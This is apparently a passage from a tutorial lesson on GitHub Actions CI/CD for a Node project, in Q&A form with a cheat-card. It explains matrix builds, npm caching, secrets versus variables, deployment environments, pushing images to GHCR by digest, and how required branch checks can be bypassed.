> A: CI means the same checks run on every push and pull request, on a clean runner, from the committed lockfile. CD means a commit that passed becomes one artifact and that artifact is what you ship. In GitHub Actions a workflow file under `.github/workflows` has `on:` and `jobs:`. Each job is a new machine. Steps are `run:` or `uses:`. This lesson's pipeline matrices Node 22, 24, and 26, checks out the repo, sets up Node with the npm download cache, runs `npm ci`, lint, test, and build, and does not cancel the other Node versions when one fails. Only a push to `main` builds the image from lesson 101's Dockerfile, pushes it to `ghcr.io` with the job's `GITHUB_TOKEN`, and records the digest. A deploy job tied to a `production` environment, reviewers and `main` only, tells the platform to run that digest. Branch protection requires the test checks, named like `test (Node 24)`. For example, a pull request goes green on all three Nodes and still publishes nothing. The limit is deploying the tag `latest`, which can move, or treating a green tick as enforcement. A check that is not required, or a job skipped by `if:` that reports success, still lets a broken merge through.

> **Q: “What is the difference between `secrets` and `vars` in GitHub Actions, and what do environments add?”**  
> A: Both live in repository or organization settings, not in the YAML. A secret is encrypted. Actions masks it in logs, though the docs say redaction is not guaranteed if you transform the value, for example base64. You cannot read a secret directly in an `if:` condition. A workflow triggered from a fork gets no secrets except the `GITHUB_TOKEN` that Actions creates for that job. A variable, `vars.*`, is plain configuration, a URL or a feature flag, and it is not masked. An environment such as `production` groups secrets and variables and adds protection rules that run before the job is scheduled: up to six reviewers, a wait timer from 1 to 43,200 minutes, and which branches may deploy. The job cannot read that environment's secrets until a reviewer approves. On Free, Pro, and Team plans those reviewer and wait rules exist only for public repositories. For example, `DEPLOY_TOKEN` is a secret and `DEPLOY_HOOK_URL` is a variable, and only the image job gets `packages: write` so it can push to `ghcr.io`. The limit is putting a secret in `if:` or in a fork's pull request workflow and expecting it to be there. Map it to `env` at job level if a step must branch on it, and do not expect fork builds to have it.

> **Q: “Why `npm ci`, and what does `cache: npm` in setup-node actually cache?”**  
> A: `npm ci` installs exactly `package-lock.json`, deletes any existing `node_modules` first, and fails if `package.json` and the lockfile disagree. Every runner, and every laptop using the same script, gets the same tree. `npm install` may update the lockfile and resolve different versions. `cache: npm` on `actions/setup-node` does not cache `node_modules`. It caches npm's download directory, `~/.npm`, and the cache key includes a hash of the lockfile. `npm ci` still runs. It reads tarballs from the restored cache instead of downloading them again. The action's own README says it does not cache `node_modules`. Since setup-node v5 this cache can turn on by itself when `packageManager` names npm, and `package-manager-cache: false` turns that off. For example, a lockfile change misses the cache and still installs the new lockfile exactly, while a source-only commit restores `~/.npm` and `npm ci` is mostly local. The limit is a stale `node_modules` you skipped `npm ci` to keep. It may have been built for another Node, and native addons then lie. Use `actions/cache` yourself only when you need a different key, such as one key per Node version.

> **Q: “A PR shows green but broke `main`. How?”**  
> A: Running CI is not the same as requiring it. Several documented ways produce a green pull request and a broken main. The check was never required, so the pull request merged while the job was still going or after people ignored it. The required job was skipped by an `if:` and GitHub counts `skipped` and `neutral` as a passing required check. The protection was not strict, so the pull request was tested against an old main and missed a conflicting commit. Or `fail-fast` stayed at its default `true`, the first red matrix leg cancelled the others, and you never saw that only one Node version failed. The fixes are required checks, the "branch must be up to date" setting, job names that are unique across workflows, and `fail-fast: false`. For example, the three checks here are `test (Node 22)`, `test (Node 24)`, and `test (Node 26)`. The limit is a `paths:` filter. A required check whose workflow never runs stays pending and blocks the merge, which is the opposite failure. A pipe in the step, `npm test | tee`, with the default `bash -e` and no `pipefail`, can also paint a step green when the test failed.

## Cheat-card

- **Workflow** file: `on:` events, then `jobs:` on separate runners, parallel unless `needs:`, then `steps:` of `run:` or `uses:`.
- **Matrix here:** Node 22, 24, and 26. `fail-fast` defaults to `true`. This workflow sets `false`.
- **Install:** `cache: npm` caches `~/.npm`, not `node_modules`. Always `npm ci`.
- **`secrets.*`** are encrypted and masked, not usable in `if:`, and not given to fork-triggered runs. **`vars.*`** are plain. Environment secrets wait for protection rules.
- **GHCR:** `login-action` with `registry: ghcr.io`, username `github.actor`, password `secrets.GITHUB_TOKEN`. The job needs `packages: write`.
- **Deploy the digest** from `build-push-action`, passed out as a job output. Do not deploy a moving tag.
- **Default `run:` shell on Linux** is `bash -e {0}`. `shell: bash` adds `-o pipefail`.
- **Required checks:** branch protection or a ruleset. `skipped` counts as passing. Keep job names unique.
- **Concurrency:** cancel old pull request runs. Do not cancel an in-progress production deploy.

## Good to know

- **How do you read a failed Actions run?** Open the red job, then the red step, and start at the first error, not the last line. Note which matrix leg failed. The step is red because the command exited non-zero, so the cause is that command's own output. Reproduce the same npm script locally. A pipe such as `npm test | tee` with the default `bash -e` hides the failure unless `shell: bash` turns on pipefail.
- **Action versions checked on 12 Oct 2026:** `actions/checkout` v7.0.1 (2026-07-20) at `@v7`, `actions/setup-node` v7.1.0 (2026-10-08) at `@v7`, `actions/cache` v6.1.0 (2026-06-26) at `@v6`, `docker/setup-buildx-action` v4.4.1 (2026-09-16) at `@v4`, `docker/login-action` v4.6.0 (2026-07-29) at `@v4`, `docker/metadata-action` v6.2.0 (2026-07-02) at `@v6`, `docker/build-push-action` v7.4.0 (2026-09-15) at `@v7`. Each `action.yml` says `using: node24`.
- **A major tag can move.** The SHA `actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1` is what `v7` pointed at on 12 Oct 2026. Pin the SHA and let Dependabot propose updates.
- **Node lines on 12 Oct 2026:** 22 is Maintenance LTS until 2027-04-30, 24 is Active LTS and enters maintenance on 2026-10-20, 26 is Current and becomes LTS on 2026-10-28. Node 20 reached end of life on 2026-04-30.
- **actionlint 1.7.12:** `actionlint path/to/file.yml`. Exit 0 means clean, 1 means problems, 3 means you are outside a git repo and passed no file. It needs `shellcheck` on `PATH` for script checks. It does not know actions newer than itself.
- **Node's test reporter:** `spec` is the default on a non-TTY since v23.0.0. Node 22 prints TAP in CI. Pass `--test-reporter=spec` when the logs should match.
- **Default job timeout** if you set none is 6 hours. Set `timeout-minutes`.

---

## Learn More

- [Workflow syntax for GitHub Actions docs.github.com](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax)
- [Deployments and environments docs.github.com](https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments)
- [Dependency caching reference docs.github.com](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching)
- [Publishing Docker images docs.github.com](https://docs.github.com/en/actions/tutorials/publish-packages/publish-docker-images)
- [Secure use reference (script injection) docs.github.com](https://docs.github.com/en/actions/reference/security/secure-use)
- [About protected branches docs.github.com](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)
- [Available rules for rulesets docs.github.com](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/available-rules-for-rulesets)
- [actions/setup-node github.com](https://github.com/actions/setup-node)
- [Cache management with GitHub Actions docs.docker.com](https://docs.docker.com/build/ci/github-actions/cache/)
- [actionlint github.com](https://github.com/rhysd/actionlint)
- [Node.js previous releases nodejs.org](https://nodejs.org/en/about/previous-releases)
